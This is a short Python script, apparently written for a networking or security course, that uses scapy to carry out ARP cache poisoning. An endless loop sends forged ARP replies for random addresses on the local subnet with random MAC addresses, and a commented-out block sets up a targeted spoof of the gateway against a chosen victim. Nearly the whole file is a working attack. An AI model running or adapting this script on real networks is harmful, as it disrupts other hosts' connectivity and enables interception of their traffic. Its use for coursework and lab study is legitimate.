__author__ = 'Yuxibro'
import logging
import socket
import time
logging.getLogger("scapy").setLevel(1)
from scapy.all import conf,sendp,srp1,ICMP,sniff,Ether,IP,ARP,UDP,BOOTP,DHCP,get_if_raw_hwaddr,random,send,RandMAC


#MAIN:
# After reading an article that's posted on course lecture note: http://www.arppoisoning.com/demonstrating-an-arp-poisoning-attack/
IPV4Address = socket.gethostbyname(socket.gethostname())
splittedIPv4 = IPV4Address.split(".")               # get current IPV4 and split it into array
print "Our IPV4 address: ",IPV4Address      #rejoin the string for printing


# takes an splitted IPv4 address and assemble it back to one string with "."
def reassembleIPAddress(splittedIPArrary):
    resultString = ""
    for index in range(len(splittedIPArrary)):
        if index < len(splittedIPArrary)-1:
            resultString+=splittedIPArrary[index]+"."
        else:
            resultString+=splittedIPArrary[index]
    return resultString

while 1:
    op = 2 # Op code 2 for ARP reply
    #TODO: Random the victim and spoof. Remember to use RandMAC
    # generate random victim
    global splittedIPv4
    randomIP = splittedIPv4
    randomIP[3] = str(random.randint(1,255))               # Random the last 8 bytes in the IP address
    #print "spoof: ",reassembleIPAddress(spoof)
    randomIP = reassembleIPAddress(randomIP)
    # Attacker MAC address
    mac = RandMAC()                                     # Random MAC Address
    arp = ARP(op=op,psrc=randomIP,hwsrc=RandMAC())   # Build ARP packet
    arp.show()
    send(arp)                                           # Send out the poison
    time.sleep(3)



# Used for targeted victim
#Q: What is randomed MAC address
#op = 2 # Op code 1 for ARP requests
# generate random victim
#victim = splittedIPv4
#victim[3] = "126"
#print "victim: ",reassembleIPAddress(victim)
#victim = reassembleIPAddress(victim)
#gateway IP address
#spoof = splittedIPv4
#spoof[3] = "1"
#print "spoof: ",reassembleIPAddress(spoof)
#spoof = reassembleIPAddress(spoof)
# Attacker MAC address
#mac = "78:31:c1:d3:ec:dc"
#arp = ARP(op=op,psrc=spoof,pdst=victim,hwdst=mac)
#arp.show()




